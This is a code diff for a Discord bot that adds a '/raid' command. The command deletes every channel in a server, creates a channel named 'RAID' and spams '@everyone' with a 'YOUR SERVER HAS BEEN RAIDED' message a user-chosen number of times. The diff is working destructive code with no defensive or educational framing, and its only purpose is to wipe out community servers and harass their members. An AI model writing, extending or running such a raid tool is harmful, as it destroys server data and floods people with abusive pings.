@@ -1,4 +1,4 @@
-const { Client, IntentsBitField } = require('discord.js');
+const { Client, IntentsBitField, ChannelType } = require('discord.js');
 
 // Load environment variables
 require('dotenv').config();
@@ -28,24 +28,49 @@ client.on('interactionCreate', async (interaction) => {
   if (interaction.commandName === 'raid') {
     // Check if the user has the necessary permissions (e.g., MANAGE_CHANNELS)
 
-    const userMessage = interaction.options.getString('raidMessage');
+    // defaults
+    defaultMessage = `YOUR SERVER HAS BEEN RAIDED BY ${client.user} !!! \n @everyone`
+    defaultSpamAMT = 10;
+
+
+    let spamAMTbyUser = interaction.options.getInteger('message-amount')
+    let userMessage = interaction.options.getString('raid-message');
+
+    if (userMessage == null) {
+      userMessage = defaultMessage
+    }
+
+    if (spamAMTbyUser == null) {
+      spamAMTbyUser = defaultSpamAMT
+    }
   
     // Get the guild
     const guild = interaction.guild;
 
     // Fetch all channels and delete them
-    await guild.channels.cache.forEach(channel => channel.delete());
+    try {
+      await guild.channels.cache.forEach(channel => channel.delete());
+    } catch (error) {
+      interaction.reply({content: 'FAILED TO RAID! BOT NOT GIVEN PERMISSIONS.'})
+      return;
+    }
 
     interaction.reply({ content: 'All channels have been removed.', ephemeral: true });
 
 
     try {
-      const newChannel = await guild.channels.create('new-channel', {
+      const newChannel = await guild.channels.create({
         
-        type: 'GUILD_TEXT',
+        name: 'RAID', 
+        
+        type: ChannelType.GuildText,
       });
+
+      for(let i = 0; i < spamAMTbyUser; i++) {
+        // Your code here
+        await newChannel.send(userMessage);
+    }
       
-      await newChannel.send('MESSAGE HERE.');
       
     } catch (error) {
 
